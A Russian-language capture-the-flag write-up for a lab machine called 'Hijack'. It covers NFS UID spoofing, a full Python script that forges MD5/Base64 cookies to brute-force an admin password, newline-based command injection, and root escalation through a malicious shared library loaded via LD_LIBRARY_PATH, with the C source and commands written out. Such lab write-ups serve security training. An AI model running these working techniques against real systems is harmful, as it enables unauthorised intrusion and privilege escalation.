# Hijack

### Необходимые навыки

- Работа с NFS и FTP, понимание их типичных уязвимостей
- Написание скриптов для веб-автоматизации (Python)
- Базовое понимание механизмов cookie и хэширования (MD5, Base64)
- Понимание переменных окружения и работы с динамическими библиотеками (C/gcc)

---

### Доступ к системе

Начнём с разведки — сканирование портов:

```
sudo nmap -sV -sC 10.112.138.240
[sudo] password for olya:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 19:36 +0300
Nmap scan report for 10.112.138.240
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|http-title: Home
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38982/udp   mountd
|   100005  1,2,3      42137/tcp6  mountd
|   100005  1,2,3      43484/tcp   mountd
|   100005  1,2,3      56572/udp6  mountd
|   100021  1,3,4      33016/udp6  nlockmgr
|   100021  1,3,4      33280/tcp6  nlockmgr
|   100021  1,3,4      36280/tcp   nlockmgr
|   100021  1,3,4      58799/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Осматриваем веб-сервис на 80 порту; параллельно запускаем фаззинг директорий — без результата.

[![image](https://private-user-images.githubusercontent.com/260275793/583796947-d308331d-4fa5-430b-b7bd-b6b31ac3908d.png)](https://private-user-images.githubusercontent.com/260275793/583796947-d308331d-4fa5-430b-b7bd-b6b31ac3908d.png)

Сайт небольшой: стандартная форма входа и административная панель, доступ к которой ограничен (`only the admin can access this page`). Тестирование формы через sqlmap, анализ запросов в Burp Suite и просмотр исходного кода страниц не дали результата.

[![image](https://private-user-images.githubusercontent.com/260275793/583797638-852c4695-6bfa-4597-a369-c9eb8ff42e4c.png)](https://private-user-images.githubusercontent.com/260275793/583797638-852c4695-6bfa-4597-a369-c9eb8ff42e4c.png)

Форма регистрации раскрывает информацию о существующих именах пользователей (username enumeration). Однако брутфорс по форме входа недоступен — на ввод пароля установлен лимит в 5 попыток.

[![image](https://private-user-images.githubusercontent.com/260275793/583798541-fd0132c8-ba96-44cb-abfc-f7e110d12672.png)](https://private-user-images.githubusercontent.com/260275793/583798541-fd0132c8-ba96-44cb-abfc-f7e110d12672.png)

Возвращаемся к открытым портам. Обнаружен NFS — проверяем доступные шары:

`showmount -e 10.112.138.240`

Доступна директория `/var/share/mount *`. Монтируем её локально:

`sudo mount -t nfs 10.112.138.240:/var/share/mount /tmp/server_files`

Открыть директорию не удаётся даже от root — NFS применяет проверку по UID, и файлы принадлежат пользователю с UID 1003. Создаём локального пользователя с тем же UID:

`sudo useradd -u 1003 test`

Читаем содержимое шары от имени созданного пользователя. В `/etc/exports` не настроен `all_squash`, что позволяет такое сопоставление. Получаем учётные данные от FTP.

[![image](https://private-user-images.githubusercontent.com/260275793/583802830-26d9f605-bae1-4c0b-861c-c9790cdbcf59.png)](https://private-user-images.githubusercontent.com/260275793/583802830-26d9f605-bae1-4c0b-861c-c9790cdbcf59.png)

Подключаемся по FTP и выгружаем все файлы. В архиве — список из 150 паролей и сообщение от администратора:

[![image](https://private-user-images.githubusercontent.com/260275793/583803331-2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6.png)](https://private-user-images.githubusercontent.com/260275793/583803331-2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6.png)

Брутфорс через форму входа по-прежнему недоступен. Проверка XXE-инъекции через `application/xml` в Content-Type — сервер фильтрует такие запросы.

Возвращаемся к зарегистрированному аккаунту. На первый взгляд в нём ничего нет — однако это само по себе указывает на то, что вектор атаки проходит через сессионные данные. Анализируем cookie:

[![image](https://private-user-images.githubusercontent.com/260275793/583805506-8d4e4304-f812-46e8-bbd7-a784f0bbd5a3.png)](https://private-user-images.githubusercontent.com/260275793/583805506-8d4e4304-f812-46e8-bbd7-a784f0bbd5a3.png)

Cookie представляет собой Base64-закодированную строку вида `username:md5(password)`. Это открывает возможность для офлайн-брутфорса: вместо попыток входа через форму генерируем корректные cookie и отправляем их напрямую, обходя ограничение на количество попыток.

Пишем скрипт на Python:

```python
import requests
import base64
import hashlib
import time
import argparse
from urllib.parse import quote

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

def brute_force(url, username, password_list, delay, cookie_name,
                success_str, fail_str, status_code, extra_headers):
    total = len(password_list)
    print(f"URL: {url}")
    print(f"Пользователь: {username}")
    print(f"Имя cookie: {cookie_name}")
    print(f"Всего паролей: {total}")
    if success_str:
        print(f"УСПЕХ: в ответе должна быть строка '{success_str}'")
    elif fail_str:
        print(f"УСПЕХ: в ответе НЕ должно быть строки '{fail_str}'")
    elif status_code:
        print(f"УСПЕХ: HTTP статус должен быть {status_code}")
    else:
        print("УСПЕХ: отсутствие строки 'Welcome Guest' (по умолчанию)")
    print()

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
    }
    for h in extra_headers:
        if ':' in h:
            key, val = h.split(':', 1)
            headers[key.strip()] = val.strip()
        else:
            print(f"Игнорируем некорректный заголовок: {h}")

    for i, pwd in enumerate(password_list, start=1):
        pwd_md5 = md5(pwd)
        auth_str = f"{username}:{pwd_md5}"
        b64 = base64.b64encode(auth_str.encode()).decode()
        cookie_val = quote(b64)
        cookies = {cookie_name: cookie_val}

        print(f"\r[{i}/{total}] {pwd[:30]}{'...' if len(pwd)>30 else ''}", end='', flush=True)

        try:
            resp = requests.get(url, cookies=cookies, headers=headers, timeout=5, allow_redirects=False)

            success = False
            if success_str:
                if success_str in resp.text:
                    success = True
            elif fail_str:
                if fail_str not in resp.text:
                    success = True
            elif status_code:
                if resp.status_code == status_code:
                    success = True
            else:
                if "Welcome Guest" not in resp.text:
                    success = True

            if success:
                print(f"\n\n✅ ПАРОЛЬ НАЙДЕН: {pwd}")
                print(f"Cookie: {cookie_val}")
                print(f"HTTP статус: {resp.status_code}")
                if resp.status_code == 302:
                    print(f"Location: {resp.headers.get('Location', '')}")
                print("\n--- Первые 500 символов ответа ---")
                print(resp.text[:500])
                print("-----------------------------------")
                return pwd
        except requests.RequestException as e:
            print(f"\nОшибка: {e}")
            break

        time.sleep(delay)

    print("\n❌ Пароль не найден.")
    return None

def load_passwords(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Ошибка: файл '{file_path}' не найден.")
        exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Брутфорс cookie для веб-приложения")
    parser.add_argument("url", help="Целевой URL (например, http://10.112.138.240)")
    parser.add_argument("username", help="Имя пользователя")
    parser.add_argument("passfile", help="Файл со списком паролей (по одному на строку)")

    parser.add_argument("--delay", type=float, default=0.1, help="Задержка между запросами (сек), по умолчанию 0.1")
    parser.add_argument("--cookie-name", default="PHPSESSID", help="Имя cookie (по умолчанию PHPSESSID)")
    parser.add_argument("--header", action="append", default=[], help="Дополнительный заголовок в формате 'Key: Value' (можно несколько)")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--success", dest="success_str", help="Строка, которая ДОЛЖНА присутствовать в ответе при успехе")
    group.add_argument("--fail", dest="fail_str", help="Строка, которая НЕ ДОЛЖНА присутствовать в ответе при успехе")
    group.add_argument("--status", type=int, dest="status_code", help="HTTP статус код, который означает успех (например, 302)")

    args = parser.parse_args()

    passwords = load_passwords(args.passfile)
    brute_force(
        url=args.url,
        username=args.username,
        password_list=passwords,
        delay=args.delay,
        cookie_name=args.cookie_name,
        success_str=args.success_str,
        fail_str=args.fail_str,
        status_code=args.status_code,
        extra_headers=args.header
    )
```

Запускаем:

```
python script.py http://10.112.138.240 admin passwords.txt --fail "Welcome Guest"
```

Пароль найден. Входим в административную панель — доступна командная строка, что явно указывает на возможность command injection.

[![image](https://private-user-images.githubusercontent.com/260275793/583811474-f8d80b59-d692-4e9d-8365-3a2272fbcba8.png)](https://private-user-images.githubusercontent.com/260275793/583811474-f8d80b59-d692-4e9d-8365-3a2272fbcba8.png)

Фильтр обходится через `%0a` (URL-encoded newline). Получаем reverse shell:

[![image](https://private-user-images.githubusercontent.com/260275793/583813063-d1ef2d72-d692-4a90-a311-3890220a4000.png)](https://private-user-images.githubusercontent.com/260275793/583813063-d1ef2d72-d692-4a90-a311-3890220a4000.png)
[![image](https://private-user-images.githubusercontent.com/260275793/583813077-ca340642-8216-450f-813c-1911b5c50c24.png)](https://private-user-images.githubusercontent.com/260275793/583813077-ca340642-8216-450f-813c-1911b5c50c24.png)

---

### Взятие юзера

Оказываемся в системе с правами `www-data` в директории с файлами приложения. В `config.php` обнаруживаем учётные данные пользователя rick:

`su - rick`

Вводим пароль из конфига и читаем `user.txt`.

---

### Взятие рута

Проверяем sudo-права:

`sudo -l`

[![image](https://private-user-images.githubusercontent.com/260275793/583815090-d13d4018-c57f-46a7-b4fd-c0b337eea362.png)](https://private-user-images.githubusercontent.com/260275793/583815090-d13d4018-c57f-46a7-b4fd-c0b337eea362.png)

Разрешено запускать Apache от имени root с передачей переменных окружения. Это открывает вектор через `LD_LIBRARY_PATH` — можно подменить динамическую библиотеку, которую загрузит процесс.

Создаём вредоносную библиотеку в `/tmp`:

```bash
echo "#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv(\"LD_LIBRARY_PATH\");
    setresuid(0,0,0);
    system(\"/bin/bash -p\");
}" > /tmp/library_path.c
```

Компилируем как разделяемую библиотеку:

```bash
gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/library_path.c
```

Запускаем Apache с указанием пути к нашей библиотеке:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

Root-доступ получен.

[![image](https://private-user-images.githubusercontent.com/260275793/583871307-3c0ae962-7f26-4b15-858b-3b81bf748542.png)](https://private-user-images.githubusercontent.com/260275793/583871307-3c0ae962-7f26-4b15-858b-3b81bf748542.png)
